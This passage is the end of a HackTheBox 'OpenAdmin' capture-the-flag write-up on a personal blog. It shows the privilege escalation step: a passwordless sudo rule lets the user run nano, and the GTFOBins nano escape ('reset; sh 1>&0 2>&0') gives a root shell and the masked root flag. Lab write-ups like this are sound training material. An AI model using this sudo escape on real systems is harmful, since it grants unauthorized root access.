+<p>The recon phase won&rsquo;t be needed there since we already got the information we needed while searching around for user flag. As a reminder:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> joanna on openadmin:
+    env_reset, mail_badpass,
+    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User joanna may run the following commands on openadmin:
+    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> NOPASSWD: /bin/nano /opt/priv
+</code></pre></div><p>A good habit for fast privilege escalation techniques is to check on <a href="https://gtfobins.github.io/">GTFOBins</a>.</p>
+<p>As a reminder:</p>
+<blockquote>
+<p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>
+<p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p>
+</blockquote>
+<p>And of course there is an entry for <code>nano</code>:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/73084568-7b88c480-3ecd-11ea-8092-c4d2e7eb43ed.png" alt="GTFObins nano"></p>
+<p><em>Note: ^R means CTRL+R, same for ^X means CTRL+X</em></p>
+<h3 id="exploit-nano-suid">Exploit nano SUID</h3>
+<p>Let&rsquo;s give it a try!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">joanna@openadmin:~$ sudo /bin/nano /opt/priv
+^R^X
+reset; sh 1&gt;&amp;<span style="color:#ae81ff">0</span> 2&gt;&amp;<span style="color:#ae81ff">0</span>
+<span style="color:#75715e"># id</span>
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>         
+<span style="color:#75715e"># cat /root/root.txt</span>                           
+2xxxxxxxxxxxxxxxxxxxxxxxx1
+</code></pre></div><hr>
+<p>As always do not hesitate to contact me for any questions or feedbacks :)</p>
+<p>See you next time !</p>
+<p>-hg8</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/posts/postman/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Postman - HackTheBox</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="/posts/bitlab/">
+                  <span class="button__text">Bitlab - HackTheBox</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        <br><br>
+<script src="https://utteranc.es/client.js"
+        repo="hg8/hg8.github.io"
+        issue-term="pathname"
+        label="💬 Comment"
+        theme="photon-dark"
+        crossorigin="anonymous"
+        async>
+</script>
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="footer__content">
+        <span>© 2020</span>
+        <span><a href="https://hg8.sh" target="_blank" rel="noopener">hg8.sh</a></span>
+        <span>
+          &nbsp; 
+          <a class="social-icon" href="https://twitter.com/_hg8_" target="_blank" rel="noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a>
+          &nbsp; 
+          <a class="social-icon" href="https://github.com/hg8" target="_blank" rel="noopener" title="Github"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a>
+          &nbsp;
+          <a class="social-icon" href="https://www.hackthebox.eu/profile/128102" target="_blank" rel="noopener" title="hackthebox"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg></a>
+          &nbsp; 
+          <a class="social-icon" href="https://hg8.sh/index.xml" target="_blank" rel="noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+        </span>
+      </div>
+    
+  </div>
+</footer>
+
+
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+      
+    </div>
+
+    
+  </body>
+</html>
